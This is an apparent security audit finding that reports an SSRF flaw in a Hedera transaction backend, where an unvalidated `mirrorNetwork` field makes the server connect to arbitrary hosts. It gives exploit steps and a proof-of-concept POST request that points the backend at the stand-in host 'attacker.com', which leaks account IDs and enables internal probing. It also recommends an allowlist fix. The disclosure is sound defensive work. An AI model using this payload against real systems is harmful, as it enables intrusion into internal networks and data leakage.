### Title
SSRF via Unvalidated `mirrorNetwork` Field in Transaction Submission Causes Backend to Make Arbitrary Outbound Connections

### Summary
The `mirrorNetwork` field in `CreateTransactionDto` is accepted as a free-form string with no whitelist validation. When a transaction is submitted, the backend uses this attacker-controlled value to construct both GRPC and HTTP connections to arbitrary hosts — first during transaction creation (to build a Hedera SDK client) and again during signature-key computation (to fetch account info from the mirror node). This is a direct analog to M-05: instead of an unvalidated swap path causing arbitrary contract calls, an unvalidated network identifier causes the backend to make arbitrary outbound network connections (SSRF).

### Finding Description

**Root cause — no whitelist on `mirrorNetwork`:**

`CreateTransactionDto` only enforces `@IsNotEmpty()` and `@IsString()` on `mirrorNetwork`: [1](#0-0) 

Any authenticated user can supply an arbitrary string such as `"attacker.com"`.

**Sink 1 — GRPC connection during transaction creation:**

`createTransactions` immediately passes `dto.mirrorNetwork` to `getClientFromNetwork`: [2](#0-1) 

`getClientFromNetwork` falls through to the `default` branch of `MirrorNetworkGRPC.fromBaseURL`, which constructs `["attacker.com:443"]` and then executes an `AddressBookQuery` (GRPC) against that host: [3](#0-2) [4](#0-3) 

**Sink 2 — HTTP connection during account-info fetch:**

The `mirrorNetwork` value is persisted to the database. Later, when the chain service computes signature keys, it calls `MirrorNodeClient.fetchAccountInfo(account, mirrorNetwork)`, which calls `getMirrorNodeRESTURL(mirrorNetwork)`: [5](#0-4) 

`MirrorNodeREST.fromBaseURL` falls through to its `default` branch: [6](#0-5) 

This produces `https://attacker.com`, and the backend then issues an HTTP GET to `https://attacker.com/api/v1/accounts/<accountId>`: [7](#0-6) 

**Exploit flow:**
1. Attacker registers a user account (no admin required).
2. Attacker POSTs `POST /transactions` with `mirrorNetwork: "attacker.com"` and valid `transactionBytes`/`signature`.
3. Backend immediately opens a GRPC connection to `attacker.com:443` to fetch the address book.
4. The transaction is stored with `mirrorNetwork = "attacker.com"`.
5. Chain service later issues HTTP GET to `https://attacker.com/api/v1/accounts/...` to resolve signing keys.

### Impact Explanation

The backend server makes attacker-directed outbound TCP (GRPC) and HTTP connections. This enables:
- **Internal network probing**: The backend's IP is trusted inside the deployment; the attacker can map internal services by observing connection timing/errors.
- **Data exfiltration**: HTTP requests carry `accountId` values in the URL path, leaking account identifiers to the attacker's server.
- **Interaction with internal services**: If internal services (e.g., Redis, PostgreSQL, other microservices) are reachable from the backend container, the GRPC/HTTP connections can be directed at them.
- **Persistent SSRF**: Because `mirrorNetwork` is stored in the database, every subsequent chain-service processing cycle re-issues the outbound request without any further user interaction.

### Likelihood Explanation

Any authenticated user (no admin, no leaked credentials) can trigger this by submitting a single API request. The `mirrorNetwork` field is explicitly documented as a user-supplied string in the API docs. No special tooling is required — a standard HTTP client suffices. The `default` branches in both `MirrorNodeREST.fromBaseURL` and `MirrorNetworkGRPC.fromBaseURL` are intentionally designed to support custom networks, making this a reachable and intended code path that simply lacks a server-side allowlist.

### Recommendation

Validate `mirrorNetwork` against an explicit allowlist on the server side before it is used to construct any network connection. Add a custom class-validator decorator or an `@IsIn([...])` constraint to `CreateTransactionDto`:

```typescript
// back-end/apps/api/src/transactions/dto/create-transaction.dto.ts
import { IsIn } from 'class-validator';

const ALLOWED_NETWORKS = ['mainnet', 'testnet', 'previewnet', 'local-node'];

@IsNotEmpty()
@IsString()
@IsIn(ALLOWED_NETWORKS)
mirrorNetwork: string;
```

If custom mirror-node endpoints must be supported, they should be configured by an administrator at the server level (e.g., via environment variable), not accepted from user-supplied request bodies.

### Proof of Concept

```
POST /transactions HTTP/1.1
Authorization: Bearer <valid_user_jwt>
Content-Type: application/json

{
  "name": "ssrf-test",
  "description": "ssrf",
  "transactionBytes": "<valid_hex_encoded_transaction>",
  "signature": "<valid_signature>",
  "creatorKeyId": <valid_key_id>,
  "mirrorNetwork": "attacker.com"
}
```

**Expected outcome:**
1. The backend opens a GRPC connection to `attacker.com:443` (observable on the attacker's server via netcat/tcpdump).
2. The transaction is stored with `mirrorNetwork = "attacker.com"`.
3. The chain service subsequently issues `GET https://attacker.com/api/v1/accounts/<accountId>` (observable in attacker's HTTP access log).
